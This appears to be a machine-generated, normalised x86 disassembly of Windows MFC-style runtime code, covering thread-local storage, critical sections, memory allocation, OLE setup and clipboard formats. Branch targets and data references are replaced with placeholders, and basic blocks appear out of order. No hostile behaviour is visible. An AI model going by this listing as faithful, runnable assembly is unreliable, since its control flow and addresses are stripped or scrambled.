lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_427179
mov eax sub_42adb2
call sub_410a78
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_427923
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_427228
mov eax sub_42adc4
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_41e2ce
push eax
call sub_4221e2
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_427334
push esi
mov esi ecx
lea eax [ esi + 0x20 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x1c ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x8 ] 0x0
sub_427369
push esi
push 0x1074
call sub_42747a
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_4270fb
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_427434
mov edx [ ecx ]
test edx edx
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
xor eax eax
cmp edx esi
jne r-xdata
xor eax eax
jmp r-xdata
test edx edx
je r-xdata
mov eax [ ecx + 0x4 ]
mov eax [ eax + esi ]
mov [ ecx ] eax
jmp r-xdata
retn 0x4
pop esi
mov ecx [ ecx + 0x4 ]
push edi
push 0x1
pop eax
test edx edx
pop edi
je r-xdata
mov edx edi
test edx edx
jne r-xdata
mov eax [ ecx + esi ]
mov [ ecx + edx ] eax
mov edi [ ecx + edx ]
cmp edi esi
je r-xdata
sub_4274ac
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_41dc26
sub_4274ee
push esi
mov esi ecx
push edi
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call [ TlsFree@IAT ]
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
push 0x0
push eax
mov ecx esi
call sub_4277ba
test edi edi
mov eax edi
jne r-xdata
add esi 0x1c
push esi
call [ DeleteCriticalSection@IAT ]
pop edi
pop esi
retn
push eax
call [ GlobalHandle@IAT ]
mov edi eax
push edi
call [ GlobalUnlock@IAT ]
push edi
call [ GlobalFree@IAT ]
sub_427545
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_410a20
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_41dc26
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_427657
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4276b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_42747a
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_427421
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_410a20
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_41dc26
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_4277ba
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x1
mov ebx ecx
pop edi
cmp [ esi + 0x8 ] edi
mov [ ebp - 0x4 ] edi
jle r-xdata
lea edi [ ebx + 0x1c ]
push edi
call [ EnterCriticalSection@IAT ]
push esi
lea ecx [ ebx + 0x14 ]
call sub_427434
push edi
call [ LeaveCriticalSection@IAT ]
push [ esi + 0xc ]
call [ LocalFree@IAT ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push 0x0
push [ ebx ]
call [ TlsSetValue@IAT ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp [ ecx + edi * 8 + 0x4 ] eax
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ esi + 0xc ]
cmp [ eax + edi * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edi
cmp edi [ esi + 0x8 ]
jl r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_427853
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
retn 0x8
push edi
push [ esp + 0xc ]
mov ecx esi
push eax
call sub_4277ba
jmp r-xdata
push [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov ecx esi
push eax
call sub_4277ba
test edi edi
mov eax edi
jne r-xdata
pop edi
sub_4278ac
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_427545
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_4276b4
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_4274ac
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_427923
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_427657
sub_427941
mov eax sub_42ae34
call sub_410a78
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_427d7a
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_427dea
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_42799c
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_427a09
mov eax sub_42aea8
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_427a4a
mov eax sub_42aebc
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
call eax
sub_427afc
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_427b4e
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_42375a
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_423716
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_427be9
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_427ce7
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_427d2c
cmp [ rw-data ] 0x0
je r-xdata
retn
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
push rw-data
call edi
mov esi rw-data
mov ebx rw-data
add ebx 0x18
add esi 0x4
cmp ebx rw-data
jl r-xdata
push ebx
call edi
dec [ esi ]
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
sub_427d7a
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_427ce7
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_427e17
push esi
mov esi [ SetErrorMode@IAT ]
push 0x0
call esi
or ax 0x8001
push eax
call esi
call sub_4272f7
mov esi [ esp + 0x8 ]
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_4272f7
cmp [ eax + 0x14 ] 0x0
pop esi
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ eax + 0x68 ] esi
mov [ eax + 0x6c ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x70 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0x74 ] ecx
mov ecx eax
call sub_427e7a
push 0x1
pop eax
retn 0x10
call sub_422a14
sub_427e7a
push ebp
mov ebp esp
sub esp 0x30c
push ebx
push esi
push edi
mov esi ecx
call sub_4272f7
mov edi eax
mov eax [ esi + 0x68 ]
mov ebx 0x104
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x68 ]
mov [ edi + 0xc ] eax
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ esi + 0x68 ]
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call sub_41192b
and [ eax ] 0x0
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x108 ]
push ebx
push eax
lea eax [ ebp - 0x20c ]
push eax
call sub_427f97
xor ebx ebx
cmp [ esi + 0x88 ] ebx
jne r-xdata
cmp [ esi + 0x78 ] ebx
jne r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_4113d9
pop ecx
mov [ esi + 0x88 ] eax
mov eax [ esi + 0x78 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x8c ] ebx
lea edi [ esi + 0x8c ]
jne r-xdata
lea eax [ ebp - 0x30c ]
push 0x100
push eax
push 0xe000
call sub_42391b
test eax eax
je r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call sub_4113d9
mov [ edi ] eax
and [ ebx ] 0x0
pop ecx
push [ esi + 0x88 ]
lea eax [ ebp - 0x30c ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call sub_4113d9
pop ecx
mov [ esi + 0x90 ] eax
call sub_4113d9
pop ecx
mov [ esi + 0x78 ] eax
sub_427f97
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
push [ esp + 0x14 ]
push edi
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
xor eax eax
push edi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
push esi
call sub_41155f
pop ecx
mov edi eax
cmp al 0x2f
je r-xdata
pop edi
pop esi
retn 0xc
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
jne r-xdata
push esi
call sub_41155f
pop ecx
mov esi eax
jmp r-xdata
sub_428008
push esi
push edi
mov edi [ RegisterClipboardFormatA@IAT ]
mov esi ecx
push r--data
call edi
push r--data
mov [ esi ] eax
call edi
push r--data
mov [ esi + 0x4 ] eax
call edi
push r--data
mov [ esi + 0x8 ] eax
call edi
push r--data
mov [ esi + 0xc ] eax
call edi
push r--data
mov [ esi + 0x10 ] eax
call edi
push r--data
mov [ esi + 0x14 ] eax
call edi
push r--data
mov [ esi + 0x18 ] eax
call edi
push r--data
mov [ esi + 0x1c ] eax
call edi
push r--data
mov [ esi + 0x20 ] eax
call edi
push r--data
mov [ esi + 0x24 ] eax
call edi
push r--data
mov [ esi + 0x28 ] eax
call edi
mov [ esi + 0x2c ] eax
mov eax esi
pop edi
pop esi
retn
sub_42808e
mov eax sub_42b499
call sub_410a78
push ecx
push ebx
push esi
call sub_4270c5
mov esi eax
call sub_4272f7
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
push ebx
call [ OleInitialize@IAT ]
cmp eax ebx
jge r-xdata
or [ esi + 0x114 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x114 ] 0x1
call sub_4229ff
mov esi eax
cmp [ esi + 0x58 ] ebx
mov [ esi + 0x54 ] sub_428186
jne r-xdata
push ebx
call sub_42812b
xor eax eax
jmp r-xdata
push 0x1
pop eax
push 0x40
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
xor eax eax
call sub_428273
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
call sub_4229ff
mov ecx [ eax + 0x58 ]
call sub_4282d1
sub_42812b
push esi
call sub_428a44
call sub_429db3
call sub_41010e
cmp [ esp + 0x8 ] 0x0
jne r-xdata
pop esi
retn 0x4
call sub_4229ff
mov esi eax
test esi esi
je r-xdata
call sub_4270c5
cmp [ eax + 0x114 ] 0x1
lea esi [ eax + 0x114 ]
jne r-xdata
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
call [ CoFreeUnusedLibraries@IAT ]
call [ OleUninitialize@IAT ]
and [ esi ] 0x0
and [ esi + 0x58 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_428186
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
cmp [ rw-data ] 0x0
mov esi [ GetTickCount@IAT ]
jne r-xdata
push [ esp + 0xc ]
call sub_42812b
jmp r-xdata
call esi
sub eax [ rw-data ]
cmp eax 0xea60
jbe r-xdata
call esi
inc [ rw-data ]
mov [ rw-data ] eax
pop esi
retn 0x8
call [ CoFreeUnusedLibraries@IAT ]
call esi
mov [ rw-data ] eax
sub_4281db
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
call sub_4227bc
push esi
push esi
push [ esp + 0x20 ]
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_428220
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
push esi
mov [ esp + 0x20 ] eax
call [ SysAllocStringByteLen@IAT ]
push esi
push esi
push [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn 0x4
sub_428273
push esi
mov esi ecx
call sub_421ce9
push 0x1
mov [ esi + 0x3c ] r--data
pop eax
xor ecx ecx
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi ] r--data
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] 0x2
mov [ esi + 0x30 ] 0x2710
mov [ esi + 0x38 ] 0x1f40
mov [ esi + 0x2c ] ecx
mov [ esi + 0x1c ] ecx
mov eax esi
pop esi
retn
sub_4282d1
push esi
mov esi ecx
push 0x0
lea eax [ esi + 0x3c ]
push eax
call [ CoRegisterMessageFilter@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push 0x1
pop eax
mov [ esi + 0x1c ] eax
pop esi
retn
sub_428347
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi ] 0x0
jmp r-xdata
pop esi
retn 0x4
sub_42837c
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0x4 ]
jne r-xdata
push edi
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
xor eax eax
pop esi
retn
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
sub_4283b9
push ebx
mov ebx ecx
push esi
mov esi [ esp + 0xc ]
mov eax [ ebx ]
push edi
push esi
call [ eax + 0x44 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x38 ]
mov edi eax
mov eax [ esi ]
cmp [ r--data ] eax
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
cmp eax [ r--data ]
jne r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
xor eax eax
add edx 0x8
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ edi + 0x4 ]
xor edx edx
mov eax [ ecx + 0xc ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov edi [ edi ]
cmp edi edx
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax ebx
cmp [ eax ] edx
jne r-xdata
mov eax [ edx + 0x4 ]
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
add ecx 0x8
jmp r-xdata
cmp [ ecx ] edx
je r-xdata
sub_428467
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
call [ eax + 0x38 ]
mov edi eax
lea esi [ eax + 0x4 ]
add eax 0x8
jmp r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
add esi 0x8
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx ]
test eax eax
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_4284c7
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_4283b9
mov esi [ esp + 0x10 ]
test eax eax
mov [ esi ] eax
je r-xdata
push [ esp + 0xc ]
mov ecx edi
call sub_428467
mov [ esi ] eax
neg eax
sbb eax eax
and eax 0x7fffbffe
add eax 0x80004002
mov ecx edi
call sub_428363
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_428509
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_4284c7
